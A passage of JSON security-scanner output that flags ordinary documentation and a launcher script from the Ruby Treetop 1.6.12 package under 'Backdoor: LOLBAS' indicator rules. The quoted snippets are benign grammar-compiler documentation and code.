                    "text": "me.\n\n    tt foo.treetop bar.treetop\n    tt foo.treetop -o foogrammar.rb\n\n##Loading A Grammar Directly\nThe Polyglot gem makes it possible to load `.treetop` or `.tt` files directly with `require`. This will invoke `Treetop.load`, which automatically compiles the grammar to Ruby and then evaluates the Ruby source. If you are getting errors in methods you define on the syntax tree, try using the command line compiler for better stack trace feedback. A better solution to this issue is in the works.\n\nIn order to use Polyglot dynamic loading of `.treetop` or `.tt` files though, you need to require the Pol",
                    "rendered": {
                      "text": "me.\n\n    tt foo.treetop bar.treetop\n    tt foo.treetop -o foogrammar.rb\n\n##Loading A Grammar Directly\nThe Polyglot gem makes it possible to load `.treetop` or `.tt` files directly with `require`. This will invoke `Treetop.load`, which automatically compiles the grammar to Ruby and then evaluates the Ruby source. If you are getting errors in methods you define on the syntax tree, try using the command line compiler for better stack trace feedback. A better solution to this issue is in the works.\n\nIn order to use Polyglot dynamic loading of `.treetop` or `.tt` files though, you need to require the Pol",
                      "markdown": "`me.\n\n    tt foo.treetop bar.treetop\n    tt foo.treetop -o foogrammar.rb\n\n##Loading A Grammar Directly\nThe Polyglot gem makes it possible to load `.treetop` or `.tt` files directly with `require`. This will invoke `Treetop.load`, which automatically compiles the grammar to Ruby and then evaluates the Ruby source. If you are getting errors in methods you define on the syntax tree, try using the command line compiler for better stack trace feedback. A better solution to this issue is in the works.\n\nIn order to use Polyglot dynamic loading of `.treetop` or `.tt` files though, you need to require the Pol`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/using_in_ruby.markdown"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 170,
                  "endLine": 9,
                  "endColumn": 176,
                  "snippet": {
                    "text": "compilation script are welcome.\n\n    tt foo.treetop bar.treetop\n    tt foo.treetop -o foogrammar.rb\n\n##Loading A Grammar Directly\nThe Polyglot gem makes it possible to load `.treetop` or `.tt` files directly with `require`. This will invoke `Treetop.load`, which automatically compiles the grammar to Ruby and then evaluates the Ruby source. If you are getting errors in methods you define on the syntax tree, try using the command line compiler for better stack trace feedback. A better solution to this issue is in the works.\n\nIn order to use Polyglot dynamic loading of `.treetop` or `.tt` files though,",
                    "rendered": {
                      "text": "compilation script are welcome.\n\n    tt foo.treetop bar.treetop\n    tt foo.treetop -o foogrammar.rb\n\n##Loading A Grammar Directly\nThe Polyglot gem makes it possible to load `.treetop` or `.tt` files directly with `require`. This will invoke `Treetop.load`, which automatically compiles the grammar to Ruby and then evaluates the Ruby source. If you are getting errors in methods you define on the syntax tree, try using the command line compiler for better stack trace feedback. A better solution to this issue is in the works.\n\nIn order to use Polyglot dynamic loading of `.treetop` or `.tt` files though,",
                      "markdown": "`compilation script are welcome.\n\n    tt foo.treetop bar.treetop\n    tt foo.treetop -o foogrammar.rb\n\n##Loading A Grammar Directly\nThe Polyglot gem makes it possible to load `.treetop` or `.tt` files directly with `require`. This will invoke `Treetop.load`, which automatically compiles the grammar to Ruby and then evaluates the Ruby source. If you are getting errors in methods you define on the syntax tree, try using the command line compiler for better stack trace feedback. A better solution to this issue is in the works.\n\nIn order to use Polyglot dynamic loading of `.treetop` or `.tt` files though,`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/using_in_ruby.markdown"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 408,
                  "endLine": 3,
                  "endColumn": 416,
                  "snippet": {
                    "text": "#Using Treetop Grammars in Ruby\n##Using the Command Line Compiler\nYou can compile `.treetop` files into Ruby source code with the `tt` command line script. `tt` takes an list of files with a `.treetop` extension and compiles them into `.rb` files of the same name. You can then `require` these files like any other Ruby script. Alternately, you can supply just one `.treetop` file and a `-o` flag to name specify the name of the output file. Improvements to this compilation script are welcome.\n\n    tt foo.treetop bar.treetop\n    tt foo.treetop -o foogrammar.rb\n",
                    "rendered": {
                      "text": "#Using Treetop Grammars in Ruby\n##Using the Command Line Compiler\nYou can compile `.treetop` files into Ruby source code with the `tt` command line script. `tt` takes an list of files with a `.treetop` extension and compiles them into `.rb` files of the same name. You can then `require` these files like any other Ruby script. Alternately, you can supply just one `.treetop` file and a `-o` flag to name specify the name of the output file. Improvements to this compilation script are welcome.\n\n    tt foo.treetop bar.treetop\n    tt foo.treetop -o foogrammar.rb\n",
                      "markdown": "`#Using Treetop Grammars in Ruby\n##Using the Command Line Compiler\nYou can compile `.treetop` files into Ruby source code with the `tt` command line script. `tt` takes an list of files with a `.treetop` extension and compiles them into `.rb` files of the same name. You can then `require` these files like any other Ruby script. Alternately, you can supply just one `.treetop` file and a `-o` flag to name specify the name of the output file. Improvements to this compilation script are welcome.\n\n    tt foo.treetop bar.treetop\n    tt foo.treetop -o foogrammar.rb\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/using_in_ruby.markdown"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 248,
                  "endLine": 3,
                  "endColumn": 254,
                  "snippet": {
                    "text": "#Using Treetop Grammars in Ruby\n##Using the Command Line Compiler\nYou can compile `.treetop` files into Ruby source code with the `tt` command line script. `tt` takes an list of files with a `.treetop` extension and compiles them into `.rb` files of the same name. You can then `require` these files like any other Ruby script. Alternately, you can supply just one `.treetop` file and a `-o` flag to name specify the name of the output file. Improvements to this compilation script are welcome.\n\n    tt foo.treetop bar.treetop\n    tt foo.treetop -o foogrammar.rb\n",
                    "rendered": {
                      "text": "#Using Treetop Grammars in Ruby\n##Using the Command Line Compiler\nYou can compile `.treetop` files into Ruby source code with the `tt` command line script. `tt` takes an list of files with a `.treetop` extension and compiles them into `.rb` files of the same name. You can then `require` these files like any other Ruby script. Alternately, you can supply just one `.treetop` file and a `-o` flag to name specify the name of the output file. Improvements to this compilation script are welcome.\n\n    tt foo.treetop bar.treetop\n    tt foo.treetop -o foogrammar.rb\n",
                      "markdown": "`#Using Treetop Grammars in Ruby\n##Using the Command Line Compiler\nYou can compile `.treetop` files into Ruby source code with the `tt` command line script. `tt` takes an list of files with a `.treetop` extension and compiles them into `.rb` files of the same name. You can then `require` these files like any other Ruby script. Alternately, you can supply just one `.treetop` file and a `-o` flag to name specify the name of the output file. Improvements to this compilation script are welcome.\n\n    tt foo.treetop bar.treetop\n    tt foo.treetop -o foogrammar.rb\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/using_in_ruby.markdown"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 37,
                  "endLine": 3,
                  "endColumn": 43,
                  "snippet": {
                    "text": "#Using Treetop Grammars in Ruby\n##Using the Command Line Compiler\nYou can compile `.treetop` files into Ruby source code with the `tt` command line script. `tt` takes an list of files with a `.treetop` extension and compiles them into `.rb` files of the same name. You can then `require` these files like any other Ruby script. Alternately, you can supply just one `.treetop` file and a `-o` flag to name specify the name of the output file. Improvements to this compilation script are welcome.\n\n    tt foo.treetop bar.treetop\n    tt foo.treetop -o foogrammar.rb\n",
                    "rendered": {
                      "text": "#Using Treetop Grammars in Ruby\n##Using the Command Line Compiler\nYou can compile `.treetop` files into Ruby source code with the `tt` command line script. `tt` takes an list of files with a `.treetop` extension and compiles them into `.rb` files of the same name. You can then `require` these files like any other Ruby script. Alternately, you can supply just one `.treetop` file and a `-o` flag to name specify the name of the output file. Improvements to this compilation script are welcome.\n\n    tt foo.treetop bar.treetop\n    tt foo.treetop -o foogrammar.rb\n",
                      "markdown": "`#Using Treetop Grammars in Ruby\n##Using the Command Line Compiler\nYou can compile `.treetop` files into Ruby source code with the `tt` command line script. `tt` takes an list of files with a `.treetop` extension and compiles them into `.rb` files of the same name. You can then `require` these files like any other Ruby script. Alternately, you can supply just one `.treetop` file and a `-o` flag to name specify the name of the output file. Improvements to this compilation script are welcome.\n\n    tt foo.treetop bar.treetop\n    tt foo.treetop -o foogrammar.rb\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/using_in_ruby.markdown"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 26,
                  "endLine": 2,
                  "snippet": {
                    "text": "#Using Treetop Grammars in Ruby\n##Using the Command Line Compiler\nYou can compile `.treetop` files into Ruby source code with the `tt` command line script. `tt` takes an list of files with a `.treetop` extension and compiles them into `.rb` files of the same name. You can then `require` these files like any other Ruby script. Alternately, you can supply just one `.treetop` file and a `-o` flag to name specify the name of the output file. Improvements to this compilation script are welcome.\n\n    tt foo.treetop bar.treetop\n",
                    "rendered": {
                      "text": "#Using Treetop Grammars in Ruby\n##Using the Command Line Compiler\nYou can compile `.treetop` files into Ruby source code with the `tt` command line script. `tt` takes an list of files with a `.treetop` extension and compiles them into `.rb` files of the same name. You can then `require` these files like any other Ruby script. Alternately, you can supply just one `.treetop` file and a `-o` flag to name specify the name of the output file. Improvements to this compilation script are welcome.\n\n    tt foo.treetop bar.treetop\n",
                      "markdown": "`#Using Treetop Grammars in Ruby\n##Using the Command Line Compiler\nYou can compile `.treetop` files into Ruby source code with the `tt` command line script. `tt` takes an list of files with a `.treetop` extension and compiles them into `.rb` files of the same name. You can then `require` these files like any other Ruby script. Alternately, you can supply just one `.treetop` file and a `-o` flag to name specify the name of the output file. Improvements to this compilation script are welcome.\n\n    tt foo.treetop bar.treetop\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/index.markdown"
                },
                "region": {
                  "startLine": 60,
                  "startColumn": 79,
                  "endLine": 60,
                  "endColumn": 85,
                  "snippet": {
                    "text": "\n\n#Reusable, Composable Language Descriptions\nBecause PEGs are closed under composition, Treetop grammars can be treated like Ruby modules. You can mix them into one another and override rules with access to the `super` keyword. You can break large grammars down into coherent units or make your language's syntax modular. This is especially useful if you want other programmers to be able to reuse your work.\n\n    grammar RubyWithEmbeddedSQL\n      include SQL\n",
                    "rendered": {
                      "text": "\n\n#Reusable, Composable Language Descriptions\nBecause PEGs are closed under composition, Treetop grammars can be treated like Ruby modules. You can mix them into one another and override rules with access to the `super` keyword. You can break large grammars down into coherent units or make your language's syntax modular. This is especially useful if you want other programmers to be able to reuse your work.\n\n    grammar RubyWithEmbeddedSQL\n      include SQL\n",
                      "markdown": "`\n\n#Reusable, Composable Language Descriptions\nBecause PEGs are closed under composition, Treetop grammars can be treated like Ruby modules. You can mix them into one another and override rules with access to the `super` keyword. You can break large grammars down into coherent units or make your language's syntax modular. This is especially useful if you want other programmers to be able to reuse your work.\n\n    grammar RubyWithEmbeddedSQL\n      include SQL\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/index.markdown"
                },
                "region": {
                  "startLine": 48,
                  "startColumn": 47,
                  "endLine": 48,
                  "endColumn": 53,
                  "snippet": {
                    "text": "      # other rules below ...\n    end\n\n...or associate rules with classes of nodes you wish your parsers to instantiate upon matching a rule.\n\n    grammar Arithmetic\n      rule additive\n",
                    "rendered": {
                      "text": "      # other rules below ...\n    end\n\n...or associate rules with classes of nodes you wish your parsers to instantiate upon matching a rule.\n\n    grammar Arithmetic\n      rule additive\n",
                      "markdown": "`      # other rules below ...\n    end\n\n...or associate rules with classes of nodes you wish your parsers to instantiate upon matching a rule.\n\n    grammar Arithmetic\n      rule additive\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/index.markdown"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 73,
                  "endLine": 3,
                  "endColumn": 79,
                  "snippet": {
                    "text": "<p class=\"intro_text\">\n\nTreetop is a language for describing languages. Combining the elegance of Ruby with cutting-edge <em>parsing expression grammars</em>, it helps you analyze syntax with revolutionary ease.\n\n</p>\n\n",
                    "rendered": {
                      "text": "<p class=\"intro_text\">\n\nTreetop is a language for describing languages. Combining the elegance of Ruby with cutting-edge <em>parsing expression grammars</em>, it helps you analyze syntax with revolutionary ease.\n\n</p>\n\n",
                      "markdown": "`<p class=\"intro_text\">\n\nTreetop is a language for describing languages. Combining the elegance of Ruby with cutting-edge <em>parsing expression grammars</em>, it helps you analyze syntax with revolutionary ease.\n\n</p>\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/grammar_composition.markdown"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 13,
                  "endLine": 53,
                  "snippet": {
                    "text": "Imagine a grammar for Ruby that took account of SQL queries embedded in strings within the language. That could be achieved by combining two existing grammars.\n\n    grammar RubyPlusSQL\n      include Ruby\n      include SQL\n      \n      rule expression\n        ruby_expression\n",
                    "rendered": {
                      "text": "Imagine a grammar for Ruby that took account of SQL queries embedded in strings within the language. That could be achieved by combining two existing grammars.\n\n    grammar RubyPlusSQL\n      include Ruby\n      include SQL\n      \n      rule expression\n        ruby_expression\n",
                      "markdown": "`Imagine a grammar for Ruby that took account of SQL queries embedded in strings within the language. That could be achieved by combining two existing grammars.\n\n    grammar RubyPlusSQL\n      include Ruby\n      include SQL\n      \n      rule expression\n        ruby_expression\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/grammar_composition.markdown"
                },
                "region": {
                  "startLine": 49,
                  "startColumn": 21,
                  "endLine": 49,
                  "endColumn": 27,
                  "snippet": {
                    "text": "Now rule `a` in grammar `B` matches either `'a'` or `'b'`.\n\n##Motivation\nImagine a grammar for Ruby that took account of SQL queries embedded in strings within the language. That could be achieved by combining two existing grammars.\n\n    grammar RubyPlusSQL\n      include Ruby\n",
                    "rendered": {
                      "text": "Now rule `a` in grammar `B` matches either `'a'` or `'b'`.\n\n##Motivation\nImagine a grammar for Ruby that took account of SQL queries embedded in strings within the language. That could be achieved by combining two existing grammars.\n\n    grammar RubyPlusSQL\n      include Ruby\n",
                      "markdown": "`Now rule `a` in grammar `B` matches either `'a'` or `'b'`.\n\n##Motivation\nImagine a grammar for Ruby that took account of SQL queries embedded in strings within the language. That could be achieved by combining two existing grammars.\n\n    grammar RubyPlusSQL\n      include Ruby\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/grammar_composition.markdown"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 42,
                  "endLine": 11,
                  "endColumn": 48,
                  "snippet": {
                    "text": "      ...\n    end\n    \nresults in a Ruby module named `Foo` and a Ruby class named `FooParser` that `include`s the `Foo` module.\n\n##Using Mixin Semantics to Compose Grammars\nBecause grammars are just modules, they can be mixed into one another. This enables grammars to share rules.\n",
                    "rendered": {
                      "text": "      ...\n    end\n    \nresults in a Ruby module named `Foo` and a Ruby class named `FooParser` that `include`s the `Foo` module.\n\n##Using Mixin Semantics to Compose Grammars\nBecause grammars are just modules, they can be mixed into one another. This enables grammars to share rules.\n",
                      "markdown": "`      ...\n    end\n    \nresults in a Ruby module named `Foo` and a Ruby class named `FooParser` that `include`s the `Foo` module.\n\n##Using Mixin Semantics to Compose Grammars\nBecause grammars are just modules, they can be mixed into one another. This enables grammars to share rules.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/grammar_composition.markdown"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 12,
                  "endLine": 11,
                  "endColumn": 18,
                  "snippet": {
                    "text": "      ...\n    end\n    \nresults in a Ruby module named `Foo` and a Ruby class named `FooParser` that `include`s the `Foo` module.\n\n##Using Mixin Semantics to Compose Grammars\nBecause grammars are just modules, they can be mixed into one another. This enables grammars to share rules.\n",
                    "rendered": {
                      "text": "      ...\n    end\n    \nresults in a Ruby module named `Foo` and a Ruby class named `FooParser` that `include`s the `Foo` module.\n\n##Using Mixin Semantics to Compose Grammars\nBecause grammars are just modules, they can be mixed into one another. This enables grammars to share rules.\n",
                      "markdown": "`      ...\n    end\n    \nresults in a Ruby module named `Foo` and a Ruby class named `FooParser` that `include`s the `Foo` module.\n\n##Using Mixin Semantics to Compose Grammars\nBecause grammars are just modules, they can be mixed into one another. This enables grammars to share rules.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/grammar_composition.markdown"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 38,
                  "endLine": 4,
                  "endColumn": 44,
                  "snippet": {
                    "text": " two grammars they yield another grammar that can be composed yet again. This is a radical departure from parsing frameworks require on lexical scanning, which makes compositionally impossible. Treetop's facilities for composition are built upon those of Ruby.\n\n##The Mapping of Treetop Constructs to Ruby Constructs\nWhen Treetop compiles a grammar definition, it produces a module and a class. The module contains methods implementing all of the rules defined in the grammar. The generated class is a subclass of Treetop::Runtime::CompiledParser and includes the module. For example:\n\n    grammar Foo\n    ",
                    "rendered": {
                      "text": " two grammars they yield another grammar that can be composed yet again. This is a radical departure from parsing frameworks require on lexical scanning, which makes compositionally impossible. Treetop's facilities for composition are built upon those of Ruby.\n\n##The Mapping of Treetop Constructs to Ruby Constructs\nWhen Treetop compiles a grammar definition, it produces a module and a class. The module contains methods implementing all of the rules defined in the grammar. The generated class is a subclass of Treetop::Runtime::CompiledParser and includes the module. For example:\n\n    grammar Foo\n    ",
                      "markdown": "` two grammars they yield another grammar that can be composed yet again. This is a radical departure from parsing frameworks require on lexical scanning, which makes compositionally impossible. Treetop's facilities for composition are built upon those of Ruby.\n\n##The Mapping of Treetop Constructs to Ruby Constructs\nWhen Treetop compiles a grammar definition, it produces a module and a class. The module contains methods implementing all of the rules defined in the grammar. The generated class is a subclass of Treetop::Runtime::CompiledParser and includes the module. For example:\n\n    grammar Foo\n    `"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/bin/tt"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 14,
                  "endLine": 2,
                  "snippet": {
                    "text": "#!/usr/bin/env ruby\nrequire 'optparse'\nrequire 'rubygems'\n\n$LOAD_PATH.unshift(File.expand_path(File.dirname(__FILE__) + \"/../lib\"))\n",
                    "rendered": {
                      "text": "#!/usr/bin/env ruby\nrequire 'optparse'\nrequire 'rubygems'\n\n$LOAD_PATH.unshift(File.expand_path(File.dirname(__FILE__) + \"/../lib\"))\n",
                      "markdown": "`#!/usr/bin/env ruby\nrequire 'optparse'\nrequire 'rubygems'\n\n$LOAD_PATH.unshift(File.expand_path(File.dirname(__FILE__) + \"/../lib\"))\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/README.md"
                },
                "region": {
                  "startLine": 196,
                  "startColumn": 98,
                  "endLine": 196,
                  "endColumn": 102,
                  "snippet": {
                    "text": "        word &{ |s| debugger; true }\n      end\n\nWhen the debugger stops here, you can inspect the contents of the SyntaxNode for \"word\" by looking at s[0], and the stack trace will show how you got there.\n",
                    "rendered": {
                      "text": "        word &{ |s| debugger; true }\n      end\n\nWhen the debugger stops here, you can inspect the contents of the SyntaxNode for \"word\" by looking at s[0], and the stack trace will show how you got there.\n",
                      "markdown": "`        word &{ |s| debugger; true }\n      end\n\nWhen the debugger stops here, you can inspect the contents of the SyntaxNode for \"word\" by looking at s[0], and the stack trace will show how you got there.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/README.md"
                },
                "region": {
                  "startLine": 170,
                  "startColumn": 233,
                  "endLine": 170,
                  "endColumn": 237,
                  "snippet": {
                    "text": "eeded by an & character.\n\nSemantic predicates\n-------------------\n\nWarning: This is an advanced feature. You need to understand the way a packrat parser operates to use it correctly. The result of computing a rule containing a semantic predicate will be memoized, even if the same rule, applied later at the same location in the input, would work differently due to a semantic predicate returning a different value. If you don't understand the previous sentence yet still use this feature, you're on your own, so test carefully!\n\nSometimes, you need to run external Ruby code to decide whether this synta",
                    "rendered": {
                      "text": "eeded by an & character.\n\nSemantic predicates\n-------------------\n\nWarning: This is an advanced feature. You need to understand the way a packrat parser operates to use it correctly. The result of computing a rule containing a semantic predicate will be memoized, even if the same rule, applied later at the same location in the input, would work differently due to a semantic predicate returning a different value. If you don't understand the previous sentence yet still use this feature, you're on your own, so test carefully!\n\nSometimes, you need to run external Ruby code to decide whether this synta",
                      "markdown": "`eeded by an & character.\n\nSemantic predicates\n-------------------\n\nWarning: This is an advanced feature. You need to understand the way a packrat parser operates to use it correctly. The result of computing a rule containing a semantic predicate will be memoized, even if the same rule, applied later at the same location in the input, would work differently due to a semantic predicate returning a different value. If you don't understand the previous sentence yet still use this feature, you're on your own, so test carefully!\n\nSometimes, you need to run external Ruby code to decide whether this synta`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/README.md"
                },
                "region": {
                  "startLine": 74,
                  "startColumn": 80,
                  "endLine": 74,
                  "endColumn": 84,
                  "snippet": {
                    "text": "rammar.rb\nputs parser.parse('hello chomsky')         # => Treetop::Runtime::SyntaxNode\nputs parser.parse('hello lambek')          # => Treetop::Runtime::SyntaxNode\nputs parser.parse('silly generativists!')  # => nil\n```\nNote that once a choice rule has matched the text using a particular alternative at a particular location in the input and hence has succeeded, that choice will never be reconsidered, even if the chosen alternative causes another rule to fail where a later alternative wouldn't have. It's always a later alternative, since the first to succeed is final - why keep looking when you've ",
                    "rendered": {
